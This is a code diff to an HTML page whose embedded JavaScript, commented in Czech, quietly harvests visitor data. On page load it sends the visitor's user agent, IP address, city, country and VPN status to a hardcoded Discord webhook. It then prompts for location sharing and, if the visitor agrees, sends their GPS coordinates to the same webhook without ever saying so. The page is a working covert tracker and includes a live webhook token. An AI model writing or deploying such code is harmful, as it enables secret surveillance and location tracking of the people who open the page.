@@ -10,7 +10,7 @@
     
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";
-        
+
         function sendToWebhook(data) {
             fetch(webhookURL, {
                 method: "POST",
@@ -23,14 +23,33 @@
             return `📱 Zařízení: ${navigator.userAgent}`;
         }
 
-        function getIPInfo() {
+        function getIPInfo(callback) {
             fetch("https://ipapi.co/json/")
                 .then(response => response.json())
                 .then(data => {
                     let ipMessage = `🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\n🌐 VPN: ${data.proxy ? "Ano" : "Ne"}`;
-                    sendToWebhook(`${getDeviceInfo()}\n${ipMessage}`);
+                    callback(ipMessage);
                 })
-                .catch(error => console.error("Chyba při získávání IP:", error));
+                .catch(error => {
+                    console.error("Chyba při získávání IP:", error);
+                    callback("🌍 IP Adresa: Neznámá\n🌐 VPN: Neznámé");
+                });
+        }
+
+        function sendInitialData() {
+            getIPInfo(ipData => {
+                let message = `${getDeviceInfo()}\n${ipData}\n📍 GPS: Nepovoleno`;
+                sendToWebhook(message);
+                askForLocation();  
+            });
+        }
+
+        function askForLocation() {
+            setTimeout(() => {
+                if (confirm("Chceš povolit sdílení polohy?")) {
+                    getLocation();
+                }
+            }, 2000);
         }
 
         function getLocation() {
@@ -38,7 +57,12 @@
                 navigator.geolocation.getCurrentPosition(position => {
                     let { latitude, longitude } = position.coords;
                     let gpsMessage = `📍 GPS Souřadnice: ${latitude}, ${longitude}\n🔗 Mapa: [Zobrazit na Mapy.cz](https://mapy.cz/zakladni?x=${longitude}&y=${latitude}&z=15)`;
-                    sendToWebhook(gpsMessage);
+                    
+                    getIPInfo(ipData => {
+                        let message = `${getDeviceInfo()}\n${ipData}\n${gpsMessage}`;
+                        sendToWebhook(message);
+                    });
+
                 }, error => {
                     console.error("GPS není povoleno", error);
                 });
@@ -47,14 +71,8 @@
             }
         }
 
-        // Spuštění získání informací
-        getIPInfo();
-
-        setTimeout(() => {
-            if (confirm("Chceš povolit sdílení polohy?")) {
-                getLocation();
-            }
-        }, 2000);
+        // Spuštění procesu
+        sendInitialData();
     </script>
 </body>
 </html>
